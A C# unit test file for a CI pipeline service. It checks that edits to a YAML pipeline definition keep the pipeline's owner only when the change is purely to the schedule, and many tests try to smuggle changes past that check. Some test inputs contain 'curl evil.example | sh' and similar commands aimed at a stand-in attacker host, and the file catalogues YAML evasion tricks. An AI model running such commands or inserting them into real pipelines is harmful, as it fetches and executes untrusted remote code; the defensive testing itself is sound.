// SPDX-License-Identifier: EUPL-1.2
using Aetheus.Back.Components.Pipelines;
using Aetheus.Shared.Components.Pipelines;

namespace Aetheus.Back.Tests.Pipelines;

/// <summary>
/// The comparison that keeps the owner of a pipeline, and so the rights its scheduled runs act with
/// (PLAN-005, question 1). The first tests hold what a move really writes; every other test is an attempt
/// to smuggle a change past the comparison, and must end as an ordinary edit (the owner moves).
/// </summary>
public sealed class PipelineScheduleOnlyEditTests
{
    private const string Steps = "stages:\n  - name: build\n    steps:\n      - name: compile\n        shell: echo safe\n";
    private const string Before = "name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n" + Steps;

    private static void AssertEdit(string before, string after) =>
        Assert.False(PipelineScheduleOnlyEdit.IsScheduleOnly(before, after), "This edit must move the owner.");

    [Theory]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 30 2 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: manual\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: manual\nschedule: \"0 30 2 * * 1-5\"\n" + Steps)]
    public void ChangeOfTheTwoLines_IsAScheduleMove(string after) =>
        Assert.True(PipelineScheduleOnlyEdit.IsScheduleOnly(Before, after));

    [Theory]
    [InlineData("name: n\n" + Steps)]
    [InlineData("name: n\ntrigger: manual\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: '0 0 1 * * *'   # 00:00 UTC\n" + Steps)]
    [InlineData("name: n\r\ntrigger: manual\r\nstages: []\r\n")]
    [InlineData("name: n\ntrigger: manual\nstages: []")]
    [InlineData("---\nname: n\ntrigger: manual\nstages: []\n")]
    public void WhatTheEditorWrites_IsAScheduleMove(string yaml)
    {
        var moved = PipelineScheduleChange.Prepare(
            yaml, new ScheduleFrequencySpec(ScheduleFrequency.Weekly, 3, 4, 15), enabled: true);
        var disabled = PipelineScheduleChange.PrepareEnabled(moved.Yaml!, enabled: false);

        Assert.True(moved.Succeeded, moved.Error);
        Assert.True(PipelineScheduleOnlyEdit.IsScheduleOnly(yaml, moved.Yaml));
        Assert.True(PipelineScheduleOnlyEdit.IsScheduleOnly(moved.Yaml, disabled.Yaml));
    }

    [Fact]
    public void ALastLineWithoutLineBreak_StaysAScheduleMoveWhenTheScheduleIsAddedAfterIt()
    {
        var yaml = "name: n\nstages: []\ntrigger: manual";
        var moved = PipelineScheduleChange.Prepare(yaml, new ScheduleFrequencySpec(ScheduleFrequency.EveryEvening, null, 1, 0), enabled: true);

        Assert.True(PipelineScheduleOnlyEdit.IsScheduleOnly(yaml, moved.Yaml), moved.Yaml);
    }

    [Theory]
    [InlineData("name: other\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\nstages:\n  - name: build\n    steps:\n      - name: compile\n        shell: curl evil.example | sh\n")]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 2 * * *\"\nstages:\n  - name: build\n    steps:\n      - name: compile\n        shell: echo safe2\n")]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 2 * * *\"\nvariables:\n  A: b\n" + Steps)]
    public void AnyOtherChange_IsAnEdit_EvenBesideAScheduleChange(string after) => AssertEdit(Before, after);

    [Theory]
    [InlineData("# reviewed\nname: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 2 * * *\"\n# added\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 2 * * *\" # added\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule # added\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n\n" + Steps)]
    [InlineData("name: n \ntrigger: schedule\nschedule: \"0 0 2 * * *\"\n" + Steps)]
    public void CommentsAndBlankLines_AreEdits(string after) => AssertEdit(Before, after);

    [Fact]
    public void AddedScheduleLine_MayNotCarryAComment() =>
        AssertEdit("name: n\ntrigger: manual\nstages: []\n", "name: n\ntrigger: manual\nschedule: \"0 0 1 * * *\" # hello\nstages: []\n");

    // The value of the line goes on over the next lines and swallows them: only one line differs.
    [Theory]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\ndescription: \"x\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: [\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: {\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: |\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: >\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule:\n" + Steps)]
    public void ValueReachingTheNextLines_IsAnEdit(string after)
    {
        // A definition where the swallowed text is part of the document: the same trick that parses.
        var before = "name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\ndescription: \"x\"\n" + Steps;
        AssertEdit(before, after);
    }

    [Fact]
    public void QuotedValueSwallowingAStage_IsAnEdit()
    {
        const string before = "name: n\ntrigger: manual\nschedule: \"a\"\nstages: []\nnote: \"b\"\n";
        const string after = "name: n\ntrigger: manual\nschedule: \"a\nstages: []\nnote: \"\n";

        AssertEdit(before, after);
    }

    // Changing the value of the line changes a step that reads it through an alias.
    [Fact]
    public void AnchoredValue_ReadByAStep_IsAnEdit()
    {
        const string before = "name: n\ntrigger: manual\nschedule: &cmd echo safe\nstages:\n  - name: b\n    steps:\n      - name: s\n        shell: *cmd\n";
        const string after = "name: n\ntrigger: manual\nschedule: &cmd curl evil.example\nstages:\n  - name: b\n    steps:\n      - name: s\n        shell: *cmd\n";

        AssertEdit(before, after);
    }

    [Theory]
    [InlineData("name: n\ntrigger: &t schedule\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: !!str schedule\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: !!str \"0 0 1 * * *\"\n" + Steps)]
    public void AnchorOrTagOnTheLine_IsAnEdit(string after) => AssertEdit(Before, after);

    [Theory]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n" + Steps + "---\nname: hidden\nstages: []\n")]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 2 * * *\"\n" + Steps + "...\n---\nname: hidden\nstages: []\n")]
    public void SecondDocument_IsAnEdit(string after) => AssertEdit(Before, after);

    [Fact]
    public void SecondDocumentAlreadyThere_IsNeverAScheduleMove() =>
        AssertEdit(
            "name: n\ntrigger: manual\nstages: []\n---\nname: hidden\nstages: []\n",
            "name: n\ntrigger: schedule\nstages: []\n---\nname: hidden\nstages: []\n");

    [Theory]
    [InlineData("name: n\ntrigger: schedule\ntrigger: manual\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\nschedule: \"0 0 2 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n\"schedule\": \"0 0 2 * * *\"\n" + Steps)]
    [InlineData("name: n\nname: other\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\n" + Steps + "stages: []\n")]
    public void RepeatedKey_IsAnEdit(string after) => AssertEdit(Before, after);

    [Fact]
    public void RepeatedKeyAlreadyThere_IsNeverAScheduleMove() =>
        AssertEdit(
            "name: n\ntrigger: manual\nstages: []\nstages: []\n",
            "name: n\ntrigger: manual\nschedule: \"0 0 1 * * *\"\nstages: []\nstages: []\n");

    [Theory]
    [InlineData("name: n\ntrigger: webhook\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: Schedule\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger:\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    [InlineData("name: n\ntrigger: \"\"\nschedule: \"0 0 1 * * *\"\n" + Steps)]
    public void TriggerOtherThanManualOrSchedule_IsAnEdit(string after) => AssertEdit(Before, after);

    [Fact]
    public void LeavingAWebhook_IsAnEdit() =>
        AssertEdit("name: n\ntrigger: webhook\nstages: []\n", "name: n\ntrigger: manual\nstages: []\n");

    // The keys of a stage, a step or a script are not the keys of the pipeline.
    [Theory]
    [InlineData("name: n\ntrigger: manual\nstages:\n  - name: b\n    schedule: \"a\"\n", "name: n\ntrigger: manual\nstages:\n  - name: b\n    schedule: \"b\"\n")]
    [InlineData("name: n\ntrigger: manual\nstages:\n  - name: b\n    trigger: manual\n", "name: n\ntrigger: manual\nstages:\n  - name: b\n    trigger: schedule\n")]
    [InlineData("name: n\nscript: |\n  schedule: a\n", "name: n\nscript: |\n  schedule: b\n")]
    public void NestedKey_IsAnEdit(string before, string after) => AssertEdit(before, after);

    // The line sits in the text of another value: it is that value that changes.
    [Fact]
    public void KeyLineInsideAQuotedText_IsAnEdit() =>
        AssertEdit(
            "name: n\ndescription: \"a\nschedule: b\nc\"\nstages: []\n",
            "name: n\ndescription: \"a\nschedule: run evil\nc\"\nstages: []\n");

    [Fact]
    public void LineBreakOnlyYamlSees_CannotHideAKeyInTheLine()
    {
        const string before = "name: n\ntrigger: manual\nschedule: \"a\" # note\nstages: []\n";
        var after = "name: n\ntrigger: manual\nschedule: \"a\" # note" + (char)0x2028 + "environment: prod\nstages: []\n";

        AssertEdit(before, after);
    }

    [Fact]
    public void QuotedOrCapitalizedKey_IsAnEdit()
    {
        AssertEdit("name: n\n\"schedule\": \"a\"\nstages: []\n", "name: n\n\"schedule\": \"b\"\nstages: []\n");
        AssertEdit("name: n\nSchedule: \"a\"\nstages: []\n", "name: n\nSchedule: \"b\"\nstages: []\n");
    }

    [Fact]
    public void ReorderedLines_AreAnEdit() =>
        AssertEdit(Before, "trigger: schedule\nname: n\nschedule: \"0 0 1 * * *\"\n" + Steps);

    [Fact]
    public void RemovedLine_IsAnEdit()
    {
        AssertEdit(Before, "name: n\ntrigger: schedule\n" + Steps);
        AssertEdit(Before, "name: n\nschedule: \"0 0 1 * * *\"\n" + Steps);
    }

    [Fact]
    public void LineEndingsChanged_IsAnEdit() =>
        AssertEdit("name: n\ntrigger: manual\nstages: []\n", "name: n\r\ntrigger: schedule\r\nstages: []\r\n");

    [Fact]
    public void ByteOrderMarkAdded_IsAnEdit() =>
        AssertEdit("name: n\ntrigger: manual\nstages: []\n", (char)0xFEFF + "name: n\ntrigger: schedule\nstages: []\n");

    [Theory]
    [InlineData(null, "name: n\n")]
    [InlineData("name: n\n", null)]
    [InlineData("", "name: n\n")]
    [InlineData("name: [unclosed\n", "name: [unclosed\ntrigger: manual\n")]
    [InlineData("name: n\n", "- a\n- b\n")]
    public void NoReadableDefinition_IsAnEdit(string? before, string? after) =>
        Assert.False(PipelineScheduleOnlyEdit.IsScheduleOnly(before, after));

    [Theory]
    [InlineData("name: n\ntrigger: manual\nstages: []\n", "name: n\ntrigger: schedule\nstages: []\n", true)]
    [InlineData("name: n\nstages: []\n", "name: n\ntrigger: schedule\nstages: []\n", true)]
    [InlineData("name: n\ntrigger: webhook\nstages: []\n", "name: n\ntrigger: schedule\nstages: []\n", true)]
    [InlineData("name: n\ntrigger: manual\nstages: []\n", "name: n\ntrigger: Schedule\nstages: []\n", true)]
    [InlineData("name: n\ntrigger: manual\nstages: []\n", "name: other\ntrigger: \"schedule\"\nstages: []\n", true)]
    [InlineData("name: [unclosed\n", "name: n\ntrigger: schedule\nstages: []\n", true)]
    [InlineData(null, "name: n\ntrigger: schedule\nstages: []\n", true)]
    [InlineData("name: n\ntrigger: schedule\nstages: []\n", "name: n\ntrigger: schedule\nschedule: \"0 0 1 * * *\"\nstages: []\n", false)]
    [InlineData("name: n\ntrigger: Schedule\nstages: []\n", "name: n\ntrigger: schedule\nstages: []\n", false)]
    [InlineData("name: n\ntrigger: schedule\nstages: []\n", "name: n\ntrigger: manual\nstages: []\n", false)]
    [InlineData("name: n\ntrigger: manual\nstages: []\n", "name: n\ntrigger: manual\nschedule: \"0 0 1 * * *\"\nstages: []\n", false)]
    [InlineData("name: n\ntrigger: manual\nstages: []\n", "name: n\ntrigger: webhook\nstages: []\n", false)]
    [InlineData("name: n\ntrigger: manual\nstages: []\n", "name: [unclosed\n", false)]
    [InlineData("name: n\ntrigger: manual\nstages:\n  - name: b\n    trigger: manual\n", "name: n\ntrigger: manual\nstages:\n  - name: b\n    trigger: schedule\n", false)]
    public void TurnsScheduleOn_IsTheTriggerTheEngineReads(string? before, string? after, bool expected) =>
        Assert.Equal(expected, PipelineScheduleOnlyEdit.TurnsScheduleOn(before, after));
}
